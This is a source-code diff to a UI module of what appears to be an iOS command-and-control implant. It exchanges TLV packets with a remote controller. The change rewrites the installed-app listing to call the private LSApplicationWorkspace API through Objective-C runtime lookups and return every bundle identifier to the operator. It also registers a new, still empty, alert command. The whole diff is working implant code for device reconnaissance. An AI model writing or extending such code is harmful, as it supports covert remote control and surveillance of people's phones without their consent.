@@ -25,10 +25,11 @@
 #ifndef _UI_H_
 #define _UI_H_
 
+#import <objc/runtime.h>
 #import <AVFoundation/AVFoundation.h>
 #import <UIKit/UIPasteboard.h>
-#import <UIKit/UIKit.h>
 #import <CoreFoundation/CoreFoundation.h>
+#import <UIKit/UIKit.h>
 
 #include <mach/port.h>
 
@@ -81,6 +82,10 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        UI_BASE, \
                        API_CALL + 9)
+#define UI_ALERT \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       UI_BASE, \
+                       API_CALL + 10)
 
 #define TLV_TYPE_LOCKED   TLV_TYPE_CUSTOM(TLV_TYPE_INT, UI_BASE, API_TYPE)
 #define TLV_TYPE_PASSCODE TLV_TYPE_CUSTOM(TLV_TYPE_INT, UI_BASE, API_TYPE + 1)
@@ -96,23 +101,22 @@ CFArrayRef SBSCopyDisplayIdentifiers(BOOL onlyActive, BOOL debuggable);
 static tlv_pkt_t *ui_app_list(c2_t *c2)
 {
     tlv_pkt_t *result;
-    CFArrayRef bundleIDs;
-    CFIndex count;
-    CFIndex iter;
+    NSMutableArray *bundleIDs;
     NSString *bundleID;
+    NSObject *workspace;
+    NSObject *app;
+    NSArray *apps;
+    Class LSApplicationWorkspace_class;
 
     result = api_craft_tlv_pkt(API_CALL_SUCCESS);
-    bundleIDs = SBSCopyDisplayIdentifiers(false, false);
 
-    if (bundleIDs != NULL)
-    {
-        count = CFArrayGetCount(bundleIDs);
+    LSApplicationWorkspace_class = objc_getClass("LSApplicationWorkspace");
+    workspace = [LSApplicationWorkspace_class performSelector:@selector(defaultWorkspace)];
+    apps = [workspace performSelector:@selector(allApplications)];
 
-        for (iter = 0; iter < count; iter++)
-        {
-            bundleID = (__bridge NSString *)CFArrayGetValueAtIndex(bundleIDs, iter);
-            tlv_pkt_add_string(result, TLV_TYPE_STRING, (char *)[bundleID UTF8String]);
-        }
+    for (app in apps) {
+        NSString *bundleID = [app performSelector:@selector(applicationIdentifier)];
+        tlv_pkt_add_string(result, TLV_TYPE_STRING, (char *)[bundleID UTF8String]);
     }
 
     return result;
@@ -172,6 +176,7 @@ static tlv_pkt_t *ui_sbinfo(c2_t *c2)
 
 static tlv_pkt_t *ui_alert(c2_t *c2)
 {
+
     return api_craft_tlv_pkt(API_CALL_SUCCESS);
 }
 
@@ -293,6 +298,7 @@ void register_ui_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, UI_OPEN_APP, ui_open_app);
     api_call_register(api_calls, UI_SBINFO, ui_sbinfo);
     api_call_register(api_calls, UI_APP_LIST, ui_app_list);
+    api_call_register(api_calls, UI_ALERT, ui_alert);
 }
 
 #endif
